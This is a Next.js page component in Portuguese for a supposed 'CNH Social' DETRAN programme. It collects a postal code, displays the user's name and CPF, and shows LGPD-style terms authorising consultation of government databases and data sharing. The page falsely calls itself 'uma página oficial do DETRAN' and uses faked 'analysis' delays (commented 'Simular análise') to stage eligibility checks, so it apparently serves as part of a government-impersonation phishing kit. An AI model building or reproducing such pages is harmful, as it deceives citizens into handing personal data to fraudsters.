'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import Header from '@/components/Header';
import AnalyzingOverlay from '@/components/AnalyzingOverlay';
import LoadingCep from '@/components/LoadingCep';
import { useAuth } from '@/contexts/AuthContext';

export default function TermosPage() {
  const router = useRouter();
  const { user, acceptTerms } = useAuth();
  const [currentView, setCurrentView] = useState<'cep' | 'loading' | 'termos'>('cep');
  const [cep, setCep] = useState('');
  const [isAccepted, setIsAccepted] = useState(false);
  const [isAnalyzing, setIsAnalyzing] = useState(false);

  useEffect(() => {
    if (!user) {
      router.push('/login');
    }
  }, [user, router]);

  if (!user) {
    return null;
  }

  const formatCep = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 5) {
      return numbers;
    }
    return `${numbers.slice(0, 5)}-${numbers.slice(5, 8)}`;
  };

  const handleCepChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCep(e.target.value);
    setCep(formatted);
  };

  const handleContinuarCep = () => {
    if (cep.replace(/\D/g, '').length === 8) {
      setCurrentView('loading');
    }
  };

  const handleLoadingComplete = () => {
    setCurrentView('termos');
  };

  const handleAccept = () => {
    if (isAccepted) {
      setIsAnalyzing(true);
      acceptTerms();
      
      // Simular análise e redirecionar com CEP
      setTimeout(() => {
        router.push(`/enderecos?cep=${cep}`);
      }, 2000);
    }
  };

  return (
    <>
      {isAnalyzing && <AnalyzingOverlay />}
      
      {/* Loading CEP */}
      {currentView === 'loading' && <LoadingCep onComplete={handleLoadingComplete} />}
      
      <div className="min-h-screen bg-gray-50">
        <Header />

      <div className="w-full">
        <Image
          src="/banner-promocional-2.png"
          alt="CNH Social 2025 - Você no caminho da sua habilitação"
          width={1920}
          height={400}
          className="h-auto w-full"
          priority
        />
      </div>

      <main className="container mx-auto px-4 py-6 sm:py-8 md:py-12">
        
        {/* View 1: CEP Input */}
        {currentView === 'cep' && (
          <div className="mx-auto max-w-2xl">
            <div className="rounded-lg border border-gray-200 bg-white p-8 shadow-md">
              <h1 className="mb-4 text-2xl font-bold text-gray-800 sm:text-3xl">
                Consulta de CNH Social por Localização
              </h1>
              
              <div className="mb-6">
                <h2 className="mb-2 text-lg font-semibold text-gray-700">
                  CEP da sua região
                </h2>
                <p className="mb-4 text-sm text-gray-600">
                  Informe seu CEP para localizar autoescolas credenciadas próximas à sua residência, facilitando o acesso às aulas e adequação às suas necessidades geográficas.
                </p>
                
                <div className="rounded-lg bg-gray-100 p-6">
                  <input
                    type="text"
                    value={cep}
                    onChange={handleCepChange}
                    placeholder="00000-000"
                    maxLength={9}
                    className="w-full rounded-lg border border-gray-300 bg-white px-4 py-3 text-center text-2xl font-semibold text-gray-700 focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-200"
                  />
                </div>
              </div>

              <button
                onClick={handleContinuarCep}
                disabled={cep.replace(/\D/g, '').length !== 8}
                className="w-full rounded-full bg-blue-600 px-8 py-3 text-lg font-semibold text-white transition-colors hover:bg-blue-700 disabled:cursor-not-allowed disabled:bg-gray-300"
              >
                Continuar
              </button>
            </div>
          </div>
        )}

        {/* View 2: Termos */}
        {currentView === 'termos' && (
        <>
        <div className="mb-6 text-center md:mb-12">
          <h1 className="mb-2 text-2xl font-bold text-gray-800 sm:text-3xl md:text-4xl">
            Termo de Uso e Aviso de Privacidade
          </h1>
          <p className="text-base text-gray-600 sm:text-lg">Programa CNH Social - DETRAN</p>
          <div className="mt-3 text-sm text-gray-500">
            <span>Atualizado em 04/06/2025 11h48</span>
          </div>
        </div>

        <div className="mx-auto max-w-4xl">
          {/* Informações do Candidato */}
          <div className="mb-8 rounded-lg border border-gray-200 bg-white p-4 shadow-md sm:p-6">
            <div className="mb-4 flex items-center">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="lucide lucide-user mr-3 h-6 w-6 text-blue-600"
                aria-hidden="true"
              >
                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"></path>
                <circle cx="12" cy="7" r="4"></circle>
              </svg>
              <h2 className="text-lg font-bold text-gray-800 sm:text-xl">Informações do Candidato</h2>
            </div>
            <div className="grid grid-cols-1 gap-4 sm:gap-6 md:grid-cols-3">
              <div>
                <span className="text-sm font-medium text-gray-500">Nome:</span>
                <p className="font-semibold text-gray-900">{user.nome.toUpperCase()}</p>
              </div>
              <div>
                <span className="text-sm font-medium text-gray-500">CPF:</span>
                <p className="font-semibold text-gray-900">
                  {user.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')}
                </p>
              </div>
              <div>
                <span className="text-sm font-medium text-gray-500">Status:</span>
                <p className="font-semibold text-green-600">Elegível</p>
              </div>
            </div>
          </div>

          {/* Toggle de Aceite */}
          <div className="mb-8 rounded-lg border border-gray-200 bg-white p-4 shadow-md sm:p-6">
            <div className="flex flex-col items-start justify-between sm:flex-row sm:items-center">
              <div className="mb-4 sm:mb-0">
                <h2 className="text-lg font-bold text-gray-800 sm:text-xl">Aceite dos Termos de Uso</h2>
                <p className="mt-1 text-sm text-gray-600">Leia e aceite os termos para continuar.</p>
              </div>
              <div className="flex items-center">
                <span className="mr-3 text-sm font-medium text-gray-700">Não Aceito</span>
                <label className="relative inline-flex cursor-pointer items-center">
                  <input
                    className="peer sr-only"
                    type="checkbox"
                    checked={isAccepted}
                    onChange={(e) => setIsAccepted(e.target.checked)}
                  />
                  <div className="peer h-7 w-14 rounded-full bg-gray-200 after:absolute after:start-[4px] after:top-[4px] after:h-5 after:w-5 after:rounded-full after:border after:border-gray-300 after:bg-white after:transition-all after:content-[''] peer-checked:bg-blue-600 peer-checked:after:translate-x-7 peer-checked:after:border-white peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rtl:peer-checked:after:-translate-x-7"></div>
                </label>
                <span className="ml-3 text-sm font-medium text-gray-700">Aceito</span>
              </div>
            </div>
          </div>

          {/* Documento dos Termos */}
          <div className="rounded-lg border border-gray-200 bg-white p-4 shadow-md sm:p-6">
            <div className="mb-4 flex items-center">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="lucide lucide-file-text mr-3 h-6 w-6 text-blue-600"
                aria-hidden="true"
              >
                <path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path>
                <path d="M14 2v4a2 2 0 0 0 2 2h4"></path>
                <path d="M10 9H8"></path>
                <path d="M16 13H8"></path>
                <path d="M16 17H8"></path>
              </svg>
              <h2 className="text-lg font-bold text-gray-800 sm:text-xl">Documento Completo dos Termos</h2>
            </div>
            <div className="mb-4 text-xs text-gray-500">
              Versão 2.1 - Adequações à Lei Geral de Proteção de Dados
            </div>
            <div className="prose prose-sm max-h-96 max-w-none overflow-y-auto rounded-lg border border-gray-200 bg-gray-50 p-4">
              <h3 className="font-bold">TERMO DE USO</h3>
              <h4>1. Sobre o Programa de Inscrições Gov.br</h4>
              <p>Este documento estabelece os termos para participação no programa "CNH Social" através da plataforma gov.br:</p>
              <ul>
                <li>Autorização para tratamento de dados pessoais conforme LGPD;</li>
                <li>Processo de inscrição automática e imediata;</li>
                <li>Critérios de elegibilidade e participação;</li>
                <li>Direitos e responsabilidades dos participantes;</li>
              </ul>
              <h4>2. Aceite e Autorização para Inscrição</h4>
              <p>
                Ao aceitar estes termos, o cidadão autoriza expressamente sua inscrição automática e imediata no programa "CNH Social" e consente com o tratamento de seus dados pessoais conforme previsto na Lei Geral de Proteção de Dados Pessoais (LGPD).
              </p>
              <p className="font-medium">A autorização abrange:</p>
              <ul>
                <li>Consulta automática de dados em bases governamentais (CPF, RG, CTPS, CadÚnico)</li>
                <li>Verificação de elegibilidade para programas sociais e de capacitação</li>
                <li>Notificações via SMS e e-mail sobre oportunidades disponíveis</li>
                <li>Compartilhamento de dados com órgãos parceiros para oferta de serviços</li>
              </ul>
              <h4>3. Processo de Inscrição Imediata</h4>
              <p>A inscrição no programa é processada automaticamente no momento da aceitação destes termos, sem necessidade de etapas adicionais. O sistema realizará:</p>
              <ul>
                <li>Validação imediata dos dados fornecidos;</li>
                <li>Criação do perfil de participante;</li>
                <li>Análise de elegibilidade para benefícios;</li>
                <li>Ativação de notificações personalizadas;</li>
              </ul>
              <h4>4. Tratamento de Dados Pessoais (LGPD)</h4>
              <p>Em conformidade com a Lei nº 13.709/2018 (LGPD), o tratamento dos dados pessoais será realizado com base nas seguintes hipóteses legais:</p>
              <ul>
                <li>Art. 7º, II - Cumprimento de obrigação legal ou regulatória;</li>
                <li>Art. 7º, III - Execução de políticas públicas;</li>
                <li>Art. 7º, I - Consentimento do titular;</li>
                <li>Art. 7º, VI - Exercício regular de direitos;</li>
              </ul>
              <h4 className="font-bold">DIREITOS DO TITULAR DOS DADOS</h4>
              <p>Conforme a LGPD, o participante possui os seguintes direitos sobre seus dados pessoais:</p>
              <ul>
                <li>Confirmação da existência de tratamento de dados;</li>
                <li>Acesso aos dados tratados;</li>
                <li>Correção de dados incompletos, inexatos ou desatualizados;</li>
                <li>Eliminação dos dados pessoais desnecessários ou excessivos;</li>
                <li>Portabilidade dos dados a outro fornecedor;</li>
                <li>Revogação do consentimento a qualquer momento;</li>
              </ul>
              <div className="border-t border-gray-200 pt-4 text-xs text-gray-500">
                <p>Última atualização: 04 de junho de 2025</p>
                <p>Versão 2.1 - Adequações à Lei Geral de Proteção de Dados</p>
              </div>
            </div>
          </div>

          {/* Cards Informativos */}
          <div className="mt-8 grid gap-4 sm:gap-8 md:grid-cols-2">
            <div className="rounded-lg border border-blue-200 bg-blue-50 p-4 sm:p-6">
              <div className="flex items-start">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="lucide lucide-info mr-4 mt-1 h-6 w-6 flex-shrink-0 text-blue-600"
                  aria-hidden="true"
                >
                  <circle cx="12" cy="12" r="10"></circle>
                  <path d="M12 16v-4"></path>
                  <path d="M12 8h.01"></path>
                </svg>
                <div>
                  <h3 className="mb-2 text-lg font-bold text-blue-800 sm:text-xl">Informações Importantes</h3>
                  <ul className="space-y-2 text-sm text-blue-900">
                    <li className="flex items-start">
                      <span className="mr-2 mt-1.5 h-1.5 w-1.5 flex-shrink-0 rounded-full bg-blue-600"></span>
                      <span>Processo 100% digital e seguro</span>
                    </li>
                    <li className="flex items-start">
                      <span className="mr-2 mt-1.5 h-1.5 w-1.5 flex-shrink-0 rounded-full bg-blue-600"></span>
                      <span>Validação automática de elegibilidade</span>
                    </li>
                    <li className="flex items-start">
                      <span className="mr-2 mt-1.5 h-1.5 w-1.5 flex-shrink-0 rounded-full bg-blue-600"></span>
                      <span>Suporte técnico disponível 24/7</span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="rounded-lg border border-green-200 bg-green-50 p-4 sm:p-6">
              <div className="flex items-start">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="lucide lucide-shield-check mr-4 mt-1 h-6 w-6 flex-shrink-0 text-green-600"
                  aria-hidden="true"
                >
                  <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
                  <path d="m9 12 2 2 4-4"></path>
                </svg>
                <div>
                  <h3 className="mb-2 text-lg font-bold text-green-800 sm:text-xl">Ambiente Seguro</h3>
                  <p className="text-sm text-green-700">
                    Esta é uma página oficial do DETRAN com certificação SSL. Seus dados estão protegidos pelos mais altos padrões de segurança.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Botão Continuar */}
          <div className="mt-8 text-center sm:mt-12">
            <button
              onClick={handleAccept}
              disabled={!isAccepted}
              className="bg-blue hover:bg-blue-600 mb-4 rounded-full px-8 py-3 text-lg font-semibold text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-300"
            >
              Continuar
            </button>
            <p className="text-sm text-gray-500">
              Em caso de dúvidas, entre em contato com nossa central de atendimento.
            </p>
          </div>
        </div>
        </>
        )}
      </main>
    </div>
    </>
  );
}
